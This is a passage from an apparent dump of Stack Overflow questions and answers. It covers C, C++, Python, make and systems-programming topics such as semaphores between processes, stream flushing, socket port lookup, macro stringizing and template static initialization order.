<p>Taking it to an extreme I even think (not to start a debate here) it would be great if I could get a warning when I don't have an ""else"" statement at the end of a decision structure.</p>

<p>So to put this in a bit of a two-part question, how much of this is possible, and how much of it exists?</p>
","9530","","<p>Yes, it depends on the compiler.  Assuming you're using GCC, there's a <a href=""http://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html"" rel=""nofollow"">host of warning options</a> that you can enable.  Compiling with the <code>-Wall -Wextra -pedantic</code> options is a good choice—if your code compiles warning-free with those options, that's a great start (though of course it does not guarantee defect-free code).</p>

<p>If you're using Xcode as a frontend to GCC, then you can enable those warning options via the project settings.</p>
"
"<p>I am trying to have two arbitrary length vectors (typical length will be 2048) and multiply element by element. So Z[n] = X[n] * Y[n] for all n. </p>

<p>The code I have setup to test is fairly basic: </p>

<pre><code>float inputX[4] = { 2, 4, 8, 16 };
float inputY[4] = { 2, 4, 8, 16 };

catlas_saxpby(4, 1, inputX, 1, 1, inputY, 1);
</code></pre>

<p>The result goes into inputY, and the result is </p>

<pre><code>4.000000, 8.000000, 16.000000, 32.000000
</code></pre>

<p>Which if they were multiplying it should be 4, 16, 64, 256. But it looks like it is adding.</p>

<p>So this is not doing what I expect, and the documentation doesn't give me enough information to figure what it is doing.</p>

<p>Any ideas?</p>

<pre><code>Apple's documentation for BLAS says this: 

Computes the product of two vectors, scaling each one separately (single-precision).

void catlas_saxpby (
   const int N,
   const float alpha,
   const float *X,
   const int incX,
   const float beta,
   float *Y,
   const int incY
);
Parameters
N
Number of elements in the vector.
alpha
Scaling factor for X.
X
Input vector X.
incX
Stride within X. For example, if incX is 7, every 7th element is used.
beta
Scaling factor for Y.
Y
Input vector Y.
incY
Stride within Y. For example, if incY is 7, every 7th element is used.
Discussion
On return, the contents of vector Y are replaced with the result.
</code></pre>
","9530","","<p>The Apple documentation is mistaken.  The <code>saxpby</code> function computes the expression <code>alpha*X + beta*Y</code> for scalars <code>alpha</code> and <code>beta</code> and vectors <code>X</code> and <code>Y</code>.</p>

<p>I don't think there's a function available to compute the element-wise product of two vectors, since that's not a common operation in linear algebra.  You could take the diagonal of the outer product, but that's a severe waste of effort since it computes the entire outer product (N<sup>2</sup> multiplications instead of N).</p>
"
"<p>I'd like to create an array of the Unicode code points which constitute white space in JavaScript (minus the Unicode-white-space code points, which I address separately).  These characters are horizontal tab, vertical tab, form feed, space, non-breaking space, and BOM.  I could do this with magic numbers:</p>

<pre><code>whitespace = [0x9, 0xb, 0xc, 0x20, 0xa0, 0xfeff]
</code></pre>

<p>That's a little bit obscure; names would be better.  The <code>unicodedata.lookup</code> method passed through <code>ord</code> helps some:</p>

<pre><code>&gt;&gt;&gt; ord(unicodedata.lookup(""NO-BREAK SPACE""))
160
</code></pre>

<p>But this doesn't work for 0x9, 0xb, or 0xc -- I think because they're control characters, and the ""names"" FORM FEED and such are just alias names.  Is there any way to map these ""names"" to the characters, or their code points, in standard Python?  Or am I out of luck?</p>
","9530","","<p>I don't think it can be done in standard Python.  The <a href=""http://docs.python.org/library/unicodedata.html"" rel=""nofollow""><code>unicodedata</code></a> module uses the <a href=""ftp://ftp.unicode.org/Public/5.2.0/ucd/UnicodeData.txt"" rel=""nofollow"">UnicodeData.txt v5.2.0</a> Unicode database.  Notice that the control characters are all assigned the name <code>&lt;control&gt;</code> (the second field, semicolon-delimited).</p>

<p>The script <code>Tools/unicode/makeunicodedata.py</code> in the Python source distribution is used to generate the table used by the Python runtime.  The <code>makeunicodename</code> function looks like this:</p>

<pre><code>def makeunicodename(unicode, trace):

    FILE = ""Modules/unicodename_db.h""

    print ""--- Preparing"", FILE, ""...""

    # collect names
    names = [None] * len(unicode.chars)

    for char in unicode.chars:
        record = unicode.table[char]
        if record:
            name = record[1].strip()
            if name and name[0] != ""&lt;"":
                names[char] = name + chr(0)
    ...
</code></pre>

<p>Notice that it skips over entries whose name begins with <code>""&lt;""</code>.  Hence, there is no name that can be passed to <code>unicodedata.lookup</code> that will give you back one of those control characters.</p>

<p>Just hardcode the code points for horizontal tab, line feed, and carriage return, and leave a descriptive comment.  As the <a href=""http://www.python.org/dev/peps/pep-0020/"" rel=""nofollow"">Zen of Python</a> goes, ""practicality beats purity"".</p>
"
"<p>In VS2010, the following code compiles and runs in a .c file:</p>

<pre><code>void F1(,a,b,c,d,e){}  // Note the leading comma.

void F2(void){
 int x = 10;
 void* y = 0;
 F1(x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, x, y);  // Compiles fine.
}
</code></pre>

<p>So it's effectively acting like this had been seen somewhere:</p>

<pre><code>void F1();
</code></pre>

<p>The following code fails to compile with an unknown identifier error on the printf line for each param:</p>

<pre><code>void F1(,a,b,c,d,e){
 printf(""%d, %d, %d, %d, %d\n"", a, b, c, d, e);
}
</code></pre>

<p>Is this part of the C standard?  Any idea what's going on?</p>
","9530","","<p>No, that is not standard behavior.  <a href=""http://connect.microsoft.com/VisualStudio"" rel=""nofollow"">File a bug</a>.  The C89 standard (draft version available <a href=""http://flash-gordon.me.uk/ansi.c.txt"" rel=""nofollow"">here</a>) defines the syntax for a function definition to be (§3.7.1):</p>

<pre>
3.7.1 Function definitions

Syntax

          function-definition:
                  declaration-specifiers&lt;opt> declarator
                            declaration-list&lt;opt> compound-statement
</pre>

<p>And §3.5.4 defines a <em>declarator</em> to be:</p>

<pre>
3.5.4 Declarators

Syntax

          declarator:
                  pointer&lt;opt> direct-declarator

          direct-declarator:
                  identifier
                  (  declarator ) 
                  direct-declarator [  constant-expression&lt;opt> ] 

                  direct-declarator (  parameter-type-list ) 
                  direct-declarator (  identifier-list&lt;opt> )

          pointer:
                  *  type-qualifier-list&lt;opt>
                  *  type-qualifier-list&lt;opt> pointer

          type-qualifier-list:
                  type-qualifier
                  type-qualifier-list type-qualifier

          parameter-type-list:
                  parameter-list
                  parameter-list , ...

          parameter-list:
                  parameter-declaration
                  parameter-list ,  parameter-declaration

          parameter-declaration:
                  declaration-specifiers declarator
                  declaration-specifiers abstract-declarator&lt;opt>

          identifier-list:
                  identifier
                  identifier-list ,  identifier
</pre>

<p>In the case of the definition <code>void F1(,a,b,c,d,e){}</code>, <code>void</code> is a <em>declaration-specifier</em> and <code>F1(,a,b,c,d,e)</code> is (supposedly) the <em>declarator</em>.  Of the 5 possible alternatives for a <em>direct-declarator</em>, the only ones it can match are the last two.  But, the parenthesized subexpression <code>,a,b,c,d,e)</code> does not match either a <em>parameter-type-list</em> or a <em>identifier-list</em>, so it is an ill-formed expression.</p>
"
"<p>Im using MS visual studio 2010 PRoofessional version , and in both languages I'm using (C++ and UnrealScript with Nfringe ) there seems to be no auto complete , also with the nfringe there is no auto indentation either . </p>

<p>I was wondering how to fix this?</p>
","9530","","<p>When you open the solution file, do you get a warning about being unable to open the IntelliSense database?  If so, that's the reason—UnrealEngine intentionally has a directory with the same name as the IntelliSense database to prevent its creation (Visual Studio can't create a file if a directory of the same name already exists).  The engine code base is so large that having IntelliSense enabled slows everything to a crawl when you're editing code.</p>
"
"<p>I'm trying to write a (mostly)* C program that sorts numerical results and eliminates duplicates. The results are stored as STRUCTS that contain a string, an integer, and 4 doubles. The doubles are what is relevant for determining if two results are duplicates.</p>

<p>To do this, I sprintf a string using the 4 doubles to some precision i.e.</p>

<pre><code>    #define PRECISION 5
sprintf(hashString, ""%.*lf %.*lf %.*lf %.*lf"", PRECISION, result.v1, PRECISION, result.v2, PRECISION, result.v3, PRECISION, result.v4);
</code></pre>

<p>I then use this as a hashkey for a  <code>tr1::unordered_map&lt;string, ResultType&gt;</code>. Then the program checks to see if the hashtable already contains an entry for that key, if so, the result is a duplicate and can be discarded. Otherwise, it gets added to the hashtable.</p>

<p>The problem is that sometimes one of my values will be rounded to zero from, for example, -10E-9, by sprintf; As a result, the string will contain ""-0.00000"" rather than ""0.00000"". These two values will obviously generate different hashkeys, despite representing the same result.  </p>

<p>Is there something built into sprintf or even the C language that will allow me to deal with this?  I've come up with a bit of a work around (see post below) -- but if there's something built in, I would much rather use that.</p>

<p>*the program is written in C because that's the language I'm most comfortable in, but I'll end up compiling with g++ in order to use the unordered_map.</p>

<p>I've come up with the following workaround.  But A) I'm hoping there's a builtin solution and B) I don't have a very deep understanding of atof or floating point math, so I'm not sure if the condition <code>if(doubleRepresentation == 0.0)</code> will always trip when it should.  </p>

<pre><code>    #include &lt;stdio.h&gt;
    #include &lt;string.h&gt;
    #include &lt;stdlib.h&gt;
    #define PRECISION 5
    #define ACCURACY 10E-6
    double getRidOfNegZeros (double number)
    {

            char someNumAsStr[PRECISION + 3]; // +3 accounts for a possible minus sign, the leading 0 or 1, and the decimal place.
            sprintf(someNumAsStr, ""%.*lf"", PRECISION, number);

            double doubleRepresentation = atof(someNumAsStr);
            if((doubleRepresentation &lt; ACCURACY) &amp;&amp; (doubleRepresentation &gt; -ACCURACY))
            {
                    doubleRepresentation = 0.0;
            }

            return doubleRepresentation;
    }

    int main()
    {
            printf(""Enter a number: \n"");
            double somenum;
            scanf(""%lf"",&amp;somenum);

            printf(""The new representation of double \""%.*lf\"" is \""%.*lf\""\n"", PRECISION, somenum, PRECISION, getRidOfNegZeros(somenum));
            return 0;
    }
</code></pre>
","9530","","<p>If you're only using this for the purposes of hashing the double values, then don't bother converting them to a string—just hash the double values directly.  Any hash library worth its salt will have the ability to hash arbitrary binary blobs of data.</p>

<p>If for some strange reason your hash library only supports null-terminated C strings, then print out the raw bytes of the <code>double</code> value:</p>

<pre><code>// Alias the double value as a byte array
unsigned char *d = (unsigned char *)&amp;result.v1;
// Prefer snprintf to sprintf!
spnrintf(hashString, hashStringLength, ""%02x%02x%02x%02x%02x%02x%02x%02x"",
         d[0], d[1], d[2], d[3], d[4], d[5], d[6], d[7]);
// ...and so on for each double value
</code></pre>

<p>This ensures that unequal values will definitely be given unequal strings.</p>
"
"<p>I am trying to find if there is better way to check if the string has special characters. In my case, anything other than alphanumeric and a '_' is considered a special character. Currently, I have a string that contains special characters such as std::string = ""!@#$%^&amp;"". I then use the std::find_first_of () algorithm to check if any of the special characters are present in the string.</p>

<p>I was wondering how to do it based on whitelisting. I want to specify the lowercase/uppercase characters, numbers and an underscore in a string ( I don't want to list them. Is there any way I can specify the ascii range of some sort like [a-zA-Z0-9_]). How can I achieve this? Then I plan to use the std::find_first_not_of(). In this way I can mention what I actually want and check for the opposite.</p>
","9530","","<p>There's no way using standard C or C++ to do that using character ranges, you have to list out all of the characters.  For C strings, you can use <a href=""http://linux.die.net/man/3/strspn"" rel=""nofollow""><code>strspn(3)</code></a> and <a href=""http://linux.die.net/man/3/strspn"" rel=""nofollow""><code>strcspn(3)</code></a> to find the first character in a string that is a member of or is not a member of a given character set.  For example:</p>

<pre><code>// Test if the given string has anything not in A-Za-z0-9_
bool HasSpecialCharacters(const char *str)
{
    return str[strspn(str, ""ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_"")] != 0;
}
</code></pre>

<p>For C++ strings, you can equivalently use the <code>find_first_of</code> and <code>find_first_not_of</code> member functions.</p>

<p>Another option is to use the <a href=""http://linux.die.net/man/3/isalnum"" rel=""nofollow""><code>isalnum(3)</code> and related functions</a> from the <code>&lt;ctype.h&gt;</code> to test if a given character is alphanumeric or not; note that these functions are <em>locale-dependent</em>, so their behavior can (and does) change in other locales.  If you do not want that behavior, then don't use them.  If you do choose to use them, you'll have to also test for underscores separately, since there's no function that tests ""alphabetic, numeric, or underscore"", and you'll also have to code your own loop to search the string (or use <code>std::find</code> with an appropriate function object).</p>
"
"<p>Having spent the last couple of days experimenting with C++ operator[] methods, I've come across an anomaly that I can't easily explain. The code below implements a simple test string class, which allows the user to access single characters via its subscript ""operator"" method. As I would like to differentiate between lvalue and rvalue subscript contexts, the ""operator"" method returns an instance of the custom ""CReference"" class as opposed to a standard C++ character reference. Whilst the ""CReference"" ""operator char()"" and ""operator=(char)"" methods appear to handle each rvalue  and lvalue context respectively, g++ refuses to compile without the presence of an additional ""operator=(CReference&amp;)"" method as documented below. Whilst the addition of this method appears to placate some kind of compile-time dependency, it is never actually invoked at run-time during the execution of the program.</p>

<p>As someone who thought they had acquired a fundamental understanding of C++ intricacies, this project has certainly proved to be a humbling experience. If anyone could see their way to enlightening me as to what's going on here, I would be eternally grateful. In the meantime, I'm going to have to pull out the C++ books in order to reconcile the void** between what I know and what I think know.</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// Class for holding a reference to type char, retuned by the ""operator[](int)""
// method of class ""TestString"". Independent methods permit differentiation
// between lvalue and rvalue contexts.
class CReference
{
 private:
   char&amp; m_characterReference;

 public:
   // Construct CReference from char&amp;
   CReference(char&amp; m_initialiser)
     : m_characterReference(m_initialiser) {}

   // Invoked when object is referenced in a rvalue char context.
   operator char()
   {
    return m_characterReference;
   }

   // Invoked when object is referenced in a lvalue char= context.
   char operator=(char c)
   {
    m_characterReference = c;
    return c;
   }

   // NEVER INVOKED, but will not compile without! WHY???
   void operator=(CReference &amp;p_assignator){}
};


// Simple string class which permits the manipulation of single characters
// via its ""operator[](int)"" method.
class TestString
{
 private:
   char m_content[23];

 public:
   // Construct string with test content.
   TestString()
   {
    strcpy(m_content, ""This is a test object."");
   }

   // Return pointer to content.
   operator const char*()
   {
    m_content[22] = 0;
    return m_content;
   }

   // Return reference to indexed character.
   CReference operator[](int index)
   {
    return m_content[index];
   }
};


int main(int argc, char *argv[])
{
 TestString s1;

 // Test both lvalue and rvalue subscript access.
 s1[0] = s1[1]; 

 // Print test string.
 printf(""%s\n"", (const char*)s1);
 return 0;
}
</code></pre>
","9530","","<p>What's happening is that without the definition of <code>operator=(CReference&amp;)</code>,there are two possible overloads of <code>operator=</code>: the implicitly-defined <code>operator=(const CReference&amp;)</code> and your <code>operator=(char)</code>.  When it tries to compiled <code>s1[0] = s1[1]</code>, it tries to find the best match for <code>operator=</code>, which is the implicitly-defined <code>operator=(const CReference&amp;)</code>.  But, that isn't allowed to be implicitly-defined, because <code>CReference</code> contains a reference member, so you get an error.</p>

<p>Conversely, when you do define <code>operator=(CReference&amp;)</code>, there's no longer an implicitly-defined assignment operator.  Sections 12.8 clauses 9-10 of the C++03 standard state:</p>

<blockquote>
  <p>9) A user-declared copy assignment <code>operator X::operator=</code> is a non-static non-template member function of class <code>X</code> with exactly one parameter of type <code>X</code>, <code>X&amp;</code>, <code>const X&amp;</code>, <code>volatile X&amp;</code> or <code>const volatile X&amp;</code>.<sup>109)</sup></p>
  
  <p>10) If the class definition does not explicitly declare a copy assignment operator, one is declared implicitly.
  The implicitly-declared copy assignment operator for a class <code>X</code> will have the form</p>

<pre><code>X&amp; X::operator=(const X&amp;)
</code></pre>
  
  <p>if<br>
  — each direct base class <code>B</code> of <code>X</code> has a copy assignment operator whose parameter is of type <code>const B&amp;</code>, <code>const volatile B&amp;</code> or <code>B</code>, and<br>
  — for all the nonstatic data members of <code>X</code> that are of a class type <code>M</code> (or array thereof), each such class type
  has a copy assignment operator whose parameter is of type <code>const M&amp;</code>, <code>const volatile M&amp;</code> or
  <code>M</code>.<sup>110)</sup></p>
  
  <p>Otherwise, the implicitly declared copy assignment operator will have the form</p>

<pre><code>X&amp; X::operator=(X&amp;)
</code></pre>
</blockquote>

<p>So, when it tries to compile <code>s1[0] = s1[1]</code>, it has two overload choices: <code>operator=(CReference&amp;)</code> and <code>operator=(char)</code>.  It choose <code>operator=(char)</code> as the better overload because it can't convert a temporary object (the result of <code>s1[1]</code>) into a non-const reference.</p>
"
"<p>I have a parent process that forks two children. I need to force a certain order for when these child processes run.</p>

<p>For example, the parent process takes a ""command"" from a file, and depending on that command, the parent will either pass that command to child a or child b using unnamed pipes. I need stuff to happen in the children in the same order that the parent received the command from the file. </p>

<p>The way I was using semaphores did not work between processes. Any ideas?</p>
","9530","","<p>Semaphores work just fine between processes.  For example:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;semaphore.h&gt;
#include &lt;unistd.h&gt;

int main(void)
{
  // Error checking omitted for expository purposes
  sem_t *sem = sem_open(""test_semaphore"", O_CREAT|O_EXCL, 0, 1);
  sem_unlink(""test_semaphore"");
  int child = fork();
  printf(""pid %d about to wait\n"", getpid());
  sem_wait(sem);
  printf(""pid %d done waiting\n"", getpid());
  sleep(1);
  printf(""pid %d done sleeping\n"", getpid());
  sem_post(sem);

  if(child &gt; 0)
  {
    int status;
    printf(""parent done, waiting for child\n"");
    wait(&amp;status);
  }

  printf(""pid %d exiting\n"", getpid());
  return 0;
}
</code></pre>

<p>Output:</p>

<pre><code>$ time ./a.out
pid 61414 about to wait
pid 61414 done waiting
pid 61415 about to wait
pid 61414 done sleeping
parent done, waiting for child
pid 61415 done waiting
pid 61415 done sleeping
pid 61415 exiting
pid 61414 exiting

real    0m2.005s
user    0m0.001s
sys 0m0.003s
</code></pre>
"
"<p>I'm new to Windows networking, and I am trying to find out which PORT number my socket is bound to (C++, Windows 7, Visual Studio 2010 Professional). It is a UDP socket, and from what I understand, using the following initial setup should bind it to a random available port/address:</p>

<pre><code>sockaddr_in local;
local.sin_family = AF_INET;
local.sin_addr.s_addr = INADDR_ANY;
local.sin_port = 0; //randomly selected port
int result = bind(clientSock, (sockaddr*)&amp;local, sizeof(local));
//result is always 0
</code></pre>

<p>As far as using this method, it works for sending data or binding it to a specific port (replacing the 0 with a desired port number). What I need is to bind it randomly, and then find out which port it was bound to afterwards. Is there any way I can do this? It seems that the ""local"" struct contains ""0.0.0.0"" as the IP address and ""0"" as the PORT number.</p>

<p>Thanks for any and all help! I appreciate it.</p>
","9530","","<p>Use <a href=""http://msdn.microsoft.com/en-us/library/ms738543%28v=vs.85%29.aspx""><code>getsockname</code></a>.  For example:</p>

<pre><code>struct sockaddr_in sin;
int addrlen = sizeof(sin);
if(getsockname(clientSock, (struct sockaddr *)&amp;sin, &amp;addrlen) == 0 &amp;&amp;
   sin.sin_family == AF_INET &amp;&amp;
   addrlen == sizeof(sin))
{
    int local_port = ntohs(sin.sin_port);
}
else
    ; // handle error
</code></pre>

<p>This also works for *nix-based systems, but note that some systems define the third argument of <code>getsockname</code> to be of type <code>socklen_t*</code> instead of <code>int*</code>, so you might get warnings about pointers differing in signedness if you're writing cross-platform code.</p>
"
"<p>I'm trying to reduce the size of an executable (using MINGW/GCC) by finding all large statically declared arrays. Is there a way to dump the list of data symbols along with their aggregate sizes?? I've looked at man pages for nm and objdump but dont see anything useful so far.</p>

<p>Thx.</p>
","9530","","<p>Use the <a href=""http://sourceware.org/binutils/docs-2.21/binutils/nm.html#nm"" rel=""nofollow""><code>nm</code></a> utility from <a href=""http://www.gnu.org/s/binutils/"" rel=""nofollow"">GNU binutils</a> with the <code>--print-size</code> option (abbreviated <code>-S</code>).  For example, to find the 20 largest symbols in an object file, do this:</p>

<pre><code>nm --print-size --size-sort objfile.o | tail -20
</code></pre>
"
"<p>The essence of my problem is that I can't write to a file in a loop with sleep(). If I have the following code:</p>

<pre><code>ofstream file
file.open(""file.name"");

for(;;) {
    file &lt;&lt; ""HELLO\n"";
}
</code></pre>

<p>This code works perfectly and prints HELLO repeatedly into ""file.name"". However, I want to do something like this (I'm recording data from a real-time application):</p>

<pre><code>for(;;) {
    file &lt;&lt; ""HELLO\n"";
    sleep(1);
}
</code></pre>

<p>This doesn't seem to print anything into my file. Any ideas?</p>
","9530","","<p>You need to flush the output.  The output stream is buffering your data into memory but not writing it out to disk.  You should either use <code>std::endl</code> (which prints a newline and flushes) instead of the string literal <code>'\n'</code>, or explicitly flush the stream with <code>std::flush</code>:</p>

<pre><code>for(;;) {
    file &lt;&lt; ""HELLO"" &lt;&lt; endl;
}
// or
for(;;) {
    file &lt;&lt; ""HELLO\n"" &lt;&lt; flush;
}
</code></pre>
"
"<p>I have to convert a set of file (let's say format fa) into another format (fb) by a command (fa2fb). Each target fb depends only on one fa file.</p>

<p>Data structure is in a format like this:</p>

<p>source:</p>

<pre><code>./DATA/L1/fa/L1.fa
./DATA/L2/fa/L2.fa
...
./DATA/Ln/fa/Ln.fa
</code></pre>

<p>target:</p>

<pre><code>./DATA/L1/fb/L1.fb
./DATA/L2/fb/L2.fb
...
./DATA/Ln/fb/Ln.fb
</code></pre>

<p>How can I implement it with make?</p>

<p>I have tried this but of course it did not work:</p>

<pre><code>./DATA/%/fb/%.fb :  ./DATA/%/fa/%.fb

    @fa2fb $&lt; $@
</code></pre>

<p>Is there any simple solution without changing the data directories?</p>

<p>Many thanks!</p>
","9530","","<p>Use <a href=""http://www.gnu.org/software/make/manual/make.html#Secondary-Expansion"" rel=""nofollow"">secondary expansion</a> and the <a href=""http://www.gnu.org/software/make/manual/make.html#Text-Functions"" rel=""nofollow""><code>subst</code> function</a> to create a rule where the prerequisites are constructed as a more complex function of the target name:</p>

<pre><code>.SECONDEXPANSION:
DATA/%.fb: $$(subst fb,fa,$$@)
    @fa2fb $&lt; $@
</code></pre>

<p>Note that this approach assumes that <code>fb</code> will not occur anywhere else in the filename (which holds true if all of your filenames are of the form <code>DATA/Ln/fb/Ln.fb</code>, for some integer <code>n</code>).</p>
"
"<p>I want to initialize a <code>mpz_t</code> variable in gmp with a very large value like a 1024 bit large integer. How can I do so ? I am new to gmp. Any help would be appreciated.</p>
","9530","","<p>Use <a href=""http://gmplib.org/manual/Integer-Import-and-Export.html#Integer-Import-and-Export"" rel=""nofollow""><code>mpz_import</code></a>.  For example:</p>

<pre><code>uint8_t input[128];
mpz_t z;
mpz_init(z);

// Convert the 1024-bit number 'input' into an mpz_t, with the most significant byte
// first and using native endianness within each byte.
mpz_import(z, sizeof(input), 1, sizeof(input[0]), 0, 0, input);
</code></pre>
"
"<p>I have a situation like this</p>

<pre><code>#define PRE 0xF1

#define SR0 0B0000
#define SR1 0B0001
#define SR2 0B0010
#define SR3 0B0011

#define VIOTA(A0)  asm("".byte PRE, A0"")

int main()
{
  VIOTA(SR1);
  return 0;
}
</code></pre>

<p>I have a top-level macro that expands out however the expansion contains more macros. These aren't being expanded and causing some problems.</p>

<p>The behaviour that I desire is that the end expansion is</p>

<p>asm("".byte 0xF1, 0B0000"")</p>

<p>Here the inner macros have been expanded. I'm really not sure what I'm doing wrong at all. Any advice?</p>
","9530","","<p>Use the stringizing operator <code>#</code> to convert tokens into strings.  However, since the stringizing operator can only be applied to macro parameters, you need to add some extra layers of macros:</p>

<pre><code>#define PRE 0xF1

#define SR0 0B0000
#define SR1 0B0001
#define SR2 0B0010
#define SR3 0B0011

#define VIOTA(A0) VIOTA_HELPER1(PRE, A0)
#define VIOTA_HELPER1(PRE, A0) VIOTA_HELPER2(PRE, A0)
#define VIOTA_HELPER2(PRE, A0) asm("".byte"" #PRE "", "" #A0)

int main(void)
{
  VIOTA(SR1);
  return 0;
}
</code></pre>

<p>After preprocessing, this expands to this:</p>

<pre><code>int main(void)
{
  asm("".byte "" ""0xF1"" "", "" ""0B0001"");
  return 0;
}
</code></pre>

<p>String constants get concatenated at compile time, so this is equivalent to <code>asm("".byte 0xF1, 0B0001"");</code>.</p>
"
"<p>In a given file if I have,</p>

<pre><code>struct A { static int a; };
struct B { static int b; };
int A::a;
int B::b;
</code></pre>

<p>Then, I can always expect that <code>A::a</code> gets initialized before <code>B::b</code>. Now for the same file, take the <code>template</code> case,</p>

<pre><code>template&lt;typename T&gt;
struct X { static T t; };
template&lt;typename T&gt;
T X&lt;T&gt;::t;
</code></pre>

<p>Suppose, <code>X</code> is instantiated with <code>A</code> and <code>B</code> and its <code>static</code> member is used arbitrarily somewhere in the code as, <code>X&lt;A&gt;::t</code> and <code>X&lt;B&gt;::t</code>, then what should be the order for initialization of <code>template</code> static member <code>X&lt;T&gt;::t;</code> ? Is it well defined ?</p>
","9530","","<p>As long as the templates only have one definition (e.g. you only have one translation unit), it's well-defined.  The static members are initialized in the order that the template specializations are instantiated <em>in contexts that require the definition of the static data member</em>.  From §14.7.1/1 [temp.inst] of the C++03 standard (emphasis mine):</p>

<blockquote>
  <p>Unless a class template specialization has been explicitly instantiated (14.7.2) or explicitly specialized (14.7.3), the class template specialization is implicitly instantiated when the specialization is referenced in a context that requires a completely-defined object type or when the completeness of the class type affects the semantics of the program. The implicit instantiation of a class template specialization causes the implicit instantiation of the declarations, but not of the definitions or default arguments, of the class member functions, member classes, static data members and member templates; and it causes the implicit instantiation of the definitions of member anonymous unions. Unless a member of a class template or a member template has been explicitly instantiated or explicitly specialized, the specialization of the member is implicitly instantiated when the specialization is referenced in a context that requires the member definition to exist; <strong>in particular, the initialization (and any associated side-effects) of a static data member does not occur unless the static data member is itself used in a way that requires the definition of the static data member to exist.</strong></p>
</blockquote>

<p>§14.7.1/7 also states:</p>

<blockquote>
  <p>The implicit instantiation of a class template does not cause any static data members of that class to be implicitly instantiated.</p>
</blockquote>

<p>However, things get more complicated when you have multiple translation units that define the template.  §3.2/5 [basic.def.odr] states:</p>

<blockquote>
  <p>There can be more than one definition of a class type (clause 9), enumeration type (7.2), inline function with external linkage (7.1.2), class template (clause 14), non-static function template (14.5.5), static data member of a class template (14.5.1.3), member function of a class template (14.5.1.1), or template specialization for which some template parameters are not specified (14.7, 14.5.4) in a program provided that each definition appears in a different translation unit, and provided the definitions satisfy the following requirements. Given such an entity named D defined in more than one translation unit, then  </p>
  
  <p>(list of conditions...)</p>
  
  <p>If the definitions of D satisfy all these requirements, then the program shall behave as if there were a single definition of D. If the definitions of D do not satisfy these requirements, then the behavior is undefined.</p>
</blockquote>

<p>Note that the standard doesn't specify <em>which</em> definition is taken as the single definition, only that <em>some</em> definition is chosen.  So, if multiple translation units instantiate the templates in different orders, there's no guarantee what the order of initialization will be.</p>
"
"<p>This is what I am trying to do in my code:
I create an event, create a thread. If something fails in the main thread, I set the event to indicate the associated thread about the failure and instruct it to gracefully exit the associated thread.</p>

<p>My question is, is it safe to close the thread handle, right after the event is set, while the associated thread is still running (trying to clean up and exit)? The intention in trying to close the thread handle immediately and not waiting for the associated thread to return is to avoid stalling others waiting on the main thread until the associated thread returns.</p>

<p>Pleases suggest. Thanks.</p>
","9530","","<p>Yes, it's safe.  From the <a href=""http://msdn.microsoft.com/en-us/library/ms682453%28v=vs.85%29.aspx"" rel=""nofollow""><code>CreateThread</code> documentation</a>:</p>

<blockquote>
  <p>The thread object remains in the system until the thread has terminated and all handles to it have been closed through a call to <code>CloseHandle</code>.</p>
</blockquote>

<p>Of course, if you close the thread's handle, then you can no longer wait on it via a call to <code>WaitForSingleObject</code>/<code>WaitForMultipleObjects</code>.</p>
"
"<p>Simple script here: </p>

<p><strong>a)</strong> constantly read from a socket and store values in an associative array<br>
<strong>b)</strong> constantly read values from stdin and respond t/f if they already exist in the associative array</p>

<p>a &amp; b are random events, not associated in any way.</p>

<p>The trick is accessing the array from both subprocesses (since putting a process in the background spawns it as a subprocess)</p>

<p>I'm thinking through the best strategy, and a few ideas occur, but I wonder if anyone has anything better in mind:</p>

<p><strong>1)</strong> redirect the input from socket to stdin as a subprocess and handle both inputs in one while loop (data sizes are small, &lt;30 characters, so I guess they will remain atomic?).<br>
<strong>2)</strong> read the socket, then STDIN with small (0.1?) timeout values on read so as to mimic non-blocking I/O.<br>
<strong>3)</strong> UPDATE: write the socket data to a file (actually have the other process write it directly to a file), then each time a request comes in to check if the value exists, process the entries in the file, adding them to the array (use file locking).</p>
","9530","","<p>Bash is not the right tool for this.  This problem is typically solved using the <a href=""http://linux.die.net/man/2/select"" rel=""nofollow""><code>select(2)</code></a> or <a href=""http://linux.die.net/man/2/poll"" rel=""nofollow""><code>poll(2)</code></a> system calls, which allow you to wait on multiple file descriptors simultaneously without spinning.  Bash does not have an interface to either of those.</p>

<p>I'd recommend using a scripting language such as Python or Perl (whatever you're comfortable with, really) that provides an interface with <code>select</code> or <code>poll</code> (e.g. Python's <a href=""http://docs.python.org/library/select.html"" rel=""nofollow""><code>select</code></a> module).</p>
"
"<p>i want covert content of NSData Which is actually i need as a double type 
   how can i convert  it?</p>

<p>here 
        1ff46c56 7dd86f40  nsdata byte and i want in double </p>
","9530","","<p>Assuming your data is exactly 8 bytes, you can convert it to a <code>double</code> using <a href=""http://linux.die.net/man/3/memcpy""><code>memcpy(3)</code></a>:</p>

<pre><code>double ConvertNSDataToDouble(NSData *data)
{
    double d;
    assert([data length] == sizeof(d));
    memcpy(&amp;d, [data bytes], sizeof(d));
    return d;
}
</code></pre>

<p>Note that this assumes that the data is in native endian format.  If you know that the data is big- or little-endian, then you may need to endian-swap the bytes first.</p>
"
"<pre><code>include&lt;stdio.h&gt;
include&lt;stdlib.h&gt;
  int main()
    {
      char a[20]=""hello world"";
system(""./cool.bat a"");\\here I need to pass the array as argument to batch file
       }
</code></pre>

<p>I believe you got what I wanted to say. I want to pass an array of the c program, as an argument to batch file. But if i say </p>

<pre><code>   system(""./omnam.bat a"") \\ its taking a as an argument
</code></pre>

<p>How do i make it? How can i send a variable or array of c program as an argument to the batch file. Suppose i might have an integer I in a c program holding a value 15.How can i pass it as an argument to the batch file ? Can anyone please post an example of it with some c file and batch file.Thank you</p>
","9530","","<p>Construct the string at runtime using <a href=""http://linux.die.net/man/3/snprintf"" rel=""nofollow""><code>snprintf</code></a>:</p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int main(void)
{
    char a[20]=""hello world"";
    char command[256];
    snprintf(command, sizeof(command), ""./cool.bat %s"", a);
    system(command);
    return 0;
}
</code></pre>

<p>However, keep in mind that the <code>system</code> function is very dangerous, especially when you pass non-constant strings.  For security purposes, <strong>be absolutely sure that no arbitrary user-generated strings can be passed into it</strong>.</p>
"
"<p>What's the best way to pass bash variables to a python script.  I'd like to do something like the following:</p>

<pre><code>$cat test.sh
#!/bin/bash

foo=""hi""
python -c 'import test; test.printfoo($foo)'

$cat test.py
